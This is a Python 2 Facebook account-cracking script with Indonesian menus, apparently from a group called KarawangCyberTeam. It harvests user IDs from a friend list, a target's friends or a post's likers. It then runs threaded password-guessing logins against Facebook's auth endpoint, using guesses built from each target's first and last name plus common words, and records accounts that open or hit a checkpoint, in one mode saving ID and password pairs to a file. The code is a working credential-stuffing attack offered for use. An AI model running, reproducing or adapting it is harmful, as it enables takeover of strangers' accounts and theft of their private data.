#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 2020.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo = """
\033[1;97m ╔══════════════♤═♤■♤═♤════════════════╗
\033[1;97m  ︻╦デ╤╾━H̷I̷L̷M̷A̷N̷ ̷M̷A̷U̷L̷A̷N̷A̷ ̷:̷)̷╾━╤デ╦︻                                    
             KarawangCyberTeam                           \033[1;97m                              
\033[1;97m  Team : Bacot Broterhood Neverdie                    
\033[1;97m ╚═════════════════════════════════════╝
\033[1;97m ╔═════════════════════════════════════╗
\033[1;97m ║ Author : 𝙷𝙸𝙻𝙼𝙰𝙽 𝙼𝙰𝚄𝙻𝙰𝙽𝙰𝟽𝟸                                  
\033[1;97m   Github : 𝚑𝚝𝚝𝚙𝚜://𝚐𝚒𝚝𝚑𝚞𝚋.𝚌𝚘𝚖/𝚖𝚊𝚗-𝚑𝚎𝚖𝚔𝚎𝚛𝟽𝟸.                
\033[1;97m ╚═════════════════════════════════════╝ """

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Sedang Masuk\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []

######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\033[1;97m ╔                                     ╗"
	print "\033[1;97m  [\033[1;97m01\033[1;97m]\033[1;96m\033[1;97m Login Menggunakan Token Facebook"
	print "\033[1;97m  [\033[1;91m00\033[1;97m]\033[1;96m\033[1;97m Keluar"
	print "\033[1;97m ╚                                     ╝"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_masuk()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m \033[1;97mToken FB? : \033[1;93m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;97m Jangan Lupa Follow Akun Pribadi Saya :)')
		jalan ('\033[1;97m[\033[1;91m•\033[1;97m•\033[1;97m]\033[1;92m Login Berhasil')
		os.system('xdg-open https://m.facebook.com/xxx.hilmanxd')
		menu()
	except KeyError:
		print "\033[1;97m[\033[1;93m!\033[1;97m] \033[1;93mToken Salah !"
		time.sleep(1.0)
		masuk()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m Nama Akun Facebook Anda:\033[1;97m·\033[1;97m "+nama
	print "\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m User ID Akun Anda:\033[1;97m·\033[1;97m "+id
	print "\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m Tanggal Lahir Facebook Anda:\033[1;97m·\033[1;97m "+ a['birthday']
	print "\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;97m\033[1;97m Crack ID Indonesia"
	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;97m\033[1;97m Crack ID Group"
	print "\033[1;97m [\033[1;97m03\033[1;97m]\033[1;97m\033[1;97m Ambil ID"
	print "\033[1;97m [\033[1;97m04\033[1;97m]\033[1;97m\033[1;97m Ikuti Saya di Facebook"
	print "\033[1;97m [\033[1;91m00\033[1;97m]\033[1;97m\033[1;97m Logout"
	print "\033[1;97m ══════════════════════════════════════════"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if unikers =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="2" or unikers =="02":
		crack_likes()
	elif unikers =="3" or unikers =="03":
		dump()
	elif unikers =="4" or unikers =="04":
		saya()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus Token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	
########## CRACK INDONESIA #######
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;97m\033[1;97m Crack dari ID Publik / Teman"
	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;97m\033[1;97m Crack dari File"
	print "\033[1;97m [\033[1;91m00\033[1;97m]\033[1;97m\033[1;97m Kembali"
	print "\033[1;97m ══════════════════════════════════════════"
	pilih_indo()

#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print "\033[1;97m ══════════════════════════════════════════"
		idt = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] Nama Akun      : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;93m!\033[1;97m] ID Publik / Teman Tidak Ada !"
			raw_input("\n[ Kembali ]")
			indo()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		try:
			print "\033[1;97m ══════════════════════════════════════════"
			idlist = raw_input('\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] Nama File Target : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[\033[1;93m!\033[1;97m] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m[!] File tidak ada !'
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
			indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] Total ID       : "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m \033[1;41;97m TO STOP PROCESS,PRESS CTRL+Z.GOOD LUCK :) \033[0m"
	print "\033[1;97m ══════════════════════════════════════════"
##### MAIN INDONESIA #####
	def main(arg):
		sys.stdout.write('\r{}'.format(datetime.now().strftime('\033[1;97m%H:%M:%S')));sys.stdout.flush()
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\033[1;92m | ' + user + ' • ' + pass1 + ' • ' + c['name']
				oks.append(user)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[1;93m | ' + user + ' • ' + pass1 + ' • ' + c['name']
					cekpoint.append(user)
				else:
					pass2 = c['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\033[1;92m | ' + user + ' • ' + pass2 + ' • ' + c['name']
						oks.append(user)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[1;93m | ' + user + ' • ' + pass2 + ' • ' + c['name']
							cekpoint.append(user)
						else:
							pass3 = c['first_name']+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\033[1;92m | ' + user + ' • ' + pass3 + ' • ' + c['name']
								oks.append(user)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[1;93m | ' + user + ' • ' + pass3 + ' • ' + c['name']
									cekpoint.append(user)
								else:
									pass4 = c['last_name']+'321'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										print '\033[1;92m | ' + user + ' • ' + pass4 + ' • ' + c['name']
										oks.append(user)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\033[1;93m | ' + user + ' • ' + pass4 + ' • ' + c['name']
											cekpoint.append(user)
										else:
											pass5 = c['last_name']+'Doraemon'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												print '\033[1;92m | ' + user + ' • ' + pass5 + ' • ' + c['name']
												oks.append(user)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\033[1;93m | ' + user + ' • ' + pass5 + ' • ' + c['name']
													cekpoint.append(user)
												else:
													pass6 = 'Anjing'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													w = json.load(data)
													if 'access_token' in w:
														print '\033[1;92m | ' + user + ' • ' + pass6 + ' • ' + c['name']
														oks.append(user)
													else:
														if 'www.facebook.com' in w['error_msg']:
															print '\033[1;93m | ' + user + ' • ' + pass6 + ' • ' + c['name']
															cekpoint.append(user)
														else:
															pass7 = 'Indonesia'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															w = json.load(data)
															if 'access_token' in w:
																print '\033[1;92m | ' + user + ' • ' + pass7 + ' • ' + c['name']
																oks.append(user)
															else:
																if 'www.facebook.com' in w['error_msg']:
																	print '\033[1;93m | ' + user + ' • ' + pass7 + ' • ' + c['name']
																	cekpoint.append(user)
																else:
																	pass8 = 'Kontol'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	w = json.load(data)
																	if 'access_token' in w:
																		print '\033[1;92m | ' + user + ' • ' + pass8 + ' • ' + c['name']
																		oks.append(user)
																	else:
																		if 'www.facebook.com' in w['error_msg']:
																			print '\033[1;93m | ' + user + ' • ' + pass8 + ' • ' + c['name']
																			cekpoint.append(user)
																		else:
																			pass9 = 'Sayang'
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			w = json.load(data)
																			if 'access_token' in w:
																				print '\033[1;92m | ' + user + ' • ' + pass9 + ' • ' + c['name']
																				oks.append(user)
																			else:
																				if 'www.facebook.com' in w['error_msg']:
																					print '\033[1;93m | ' + user + ' • ' + pass9 + ' • ' + c['name']
																					cekpoint.append(user)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print 45* "\033[1;97m="
	print '\033[1;97m[\033[1;91m•\033[1;93m•\033[1;92m•\033[1;97m] \033[1;97mSelesai Dek.....'
	print"\033[1;97m[\033[1;91m•\033[1;93m•\033[1;92m•\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m[\033[1;91m•\033[1;93m•\033[1;92m•\033[1;97m] \033[1;97mCP file tersimpan : out/indo1.txt'
	print 45* "\033[1;97m="
	raw_input("\033[1;97m[\033[1;97m Kembali \033[1;97m]")
	os.system("python2 2020.py")
	
##### CRACK LIKES #####
def crack_likes():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('clear')
		print logo
		print "\033[1;97m ══════════════════════════════════════════"
		tez = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] ID Postingan Group / Teman : ")
		r = requests.get("https://graph.facebook.com/"+tez+"/likes?limit=5000&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		jalan('\r\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] \033[1;97mSukses Mengambil ID \033[1;97m...')
	except KeyError:
		print"\033[1;97m[\033[1;93m!\033[1;97m] \033[1;97mID Postingan Salah !"
		raw_input('\n\033[1;93m[ \033[1;97mKembali \033[1;93m]')
		crack_likes()
		
	print "\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] Total ID : "+str(len(id))
	print('\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m•\033[1;97m] Crack Berjalan Dek "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m=========================================="
	
##### MAIN LIKES #####
	def main(arg):
		sys.stdout.write('\r{}'.format(datetime.now().strftime('\033[1;97m%H:%M:%S')));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print '\033[1;92m | ' + zowe + ' | ' + bos1 + ' | ' + j['name']
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print '\033[1;93m | ' + zowe + ' | ' + bos1 + ' | ' + j['name']
					cek = open("done/grup.txt", "a")
					cek.write("ID:" +zowe+ " PW:" +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print '\033[1;92m | ' + zowe + ' | ' + bos2 + ' | ' + j['name']
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print '\033[1;93m | ' + zowe + ' | ' + bos2 + ' | ' + j['name']
							cek = open("done/grup.txt", "a")
							cek.write("ID:" +zowe+ " PW:" +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name']+'123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print '\033[1;92m | ' + zowe + ' | ' + bos3 + ' | ' + j['name']
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print '\033[1;93m | ' + zowe + ' | ' + bos3 + ' | ' + j['name']
									cek = open("done/grup.txt", "a")
									cek.write("ID:" +zowe+ " PW:" +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['first_name']+'321'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print '\033[1;92m | ' + zowe + ' | ' + bos4 + ' | ' + j['name']
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print '\033[1;93m | ' + zowe + ' | ' + bos4 + ' | ' + j['name']
											cek = open("done/grup.txt", "a")
											cek.write("ID:" +zowe+ " PW:" +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['last_name']+'123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print '\033[1;92m | ' + zowe + ' | ' + bos5 + ' | ' + j['name']
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print '\033[1;93m | ' + zowe + ' | ' + bos5 + ' | ' + j['name']
													cek = open("done/grup.txt", "a")
													cek.write("ID:" +zowe+ " PW:" +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = 'Anjing'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print '\033[1;92m | ' + zowe + ' | ' + bos6 + ' | ' + j['name']
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print '\033[1;93m | ' + zowe + ' | ' + bos6 + ' | ' + j['name']
															cek = open("done/grup.txt", "a")
															cek.write("ID:" +zowe+ " PW:" +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print 45* "\033[1;97m="
	print '\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mCP file tersimpan : done/grup.txt'
	print 45* "\033[1;97m="
	raw_input("\033[1;97m[\033[1;97m Kembali \033[1;97m]")
	os.system("python2 UNIS3X.py")
	
######### DUMP ##########
def dump():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		menu()
	os.system('clear')
	print logo
	print "\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;93m\033[1;97m Ambil ID dari Daftar Teman "
	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;93m\033[1;97m Ambil ID dari Publik / Teman "
	print "\033[1;97m [\033[1;91m00\033[1;97m]\033[1;93m\033[1;97m Kembali "
	print "\033[1;97m ══════════════════════════════════════════"
	dump_pilih()
	
	
def dump_pilih():
	cuih = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if cuih =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		dump_pilih()
	elif cuih =="1" or cuih =="01":
		id_teman()
	elif cuih =="2" or cuih =="02":
		idfrom_teman()
	elif cuih =="0" or cuih =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		dump_pilih()
		
##### ID TEMAN #####
def id_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		print 45* "\033[1;97m="
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mMengambil semua ID Teman \033[1;97m...')
		bz = open('out/id_teman.txt','w')
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[\033[1;93m"+str(len(idteman))+"\033[1;97m]\033[1;97m =>"),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[1;97m'+a['id']
		bz.close()
		print '\r\033[1;97m[\033[1;93m✓\033[1;97m] \033[1;97mSukses Mengambil ID \033[1;97m....'
		print"\r\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mTotal ID : %s"%(len(idteman))
		done = raw_input("\r\033[1;97m[\033[1;93m?\033[1;97m] \033[1;97mSimpan Nama File : ")
		os.rename('out/id_teman.txt','out/'+done)
		print("\r\033[1;97m[\033[1;95m+\033[1;97m] \033[1;97mFile tersimpan : \033[1;97mout/"+done)
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		raw_input("\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		os.system("python2 UNIS3X.py")
	except IOError:
		print"\033[1;91m[!] Gagal membuat file"
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!] Terhenti !")
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Gagal !')
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except OSError:
		print('\033[1;97m[\033[1;95m!\033[1;97m]\033[1;97m File anda tidak tersimpan !')
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		os.system("python2 2020.py")
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[×] Tidak ada koneksi !"
		keluar()

##### ID PUBLIK #####
def idfrom_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		print "\033[1;97m ══════════════════════════════════════════"
		idt = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] \033[1;97mNama Akun      : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;91m•\033[1;93m•\033[1;92m•\033[1;97m] ID Publik Tidak Ada !"
			raw_input("\n\033[1;97m[\033[1;97m Kembali \033[1;97m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] \033[1;97mMengambil Semua ID ...')
		print "\033[1;97m ══════════════════════════════════════════"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m [ \033[1;97m"+str(len(idfromteman))+"\033[1;97m ]\033[1;91m •\033[1;97m•\033[1;97m"),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[1;97m ' + a['id']
		bz.close()
		print '\r\033[1;97m[\033[1;93m✓\033[1;97m] \033[1;97mSukses Mengambil ID \033[1;97m....'
		print"\r\033[1;97m[\033[1;93m•\033[1;97m] Total ID : %s"%(len(idfromteman))
		done = raw_input("\r\033[1;97m[\033[1;93m+\033[1;97m] \033[1;97mSimpan Nama File : ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[\033[1;95m√\033[1;97m] File tersimpan : out/"+done)
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except OSError:
		print"\033[1;97m[!] File Tidak Tersimpan "
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		os.system("python2 2020.py")
	except IOError:
		print"\033[1;97m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		os.system("python2 2020.py")
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!] Terhenti")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;97m[\033[1;95m!\033[1;97m] Teman tidak ada !')
		raw_input("\n\033[1;93m[\033[1;97m Kembali \033[1;93m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[\033[1;91m✖\033[1;97m] Tidak ada koneksi !"
		keluar()
		
	
#######SAYA########
def saya():
	os.system ('clear')
	print logo
	jalan ('        \033[92mAnda Akan Di Arahkan Ke Browser')
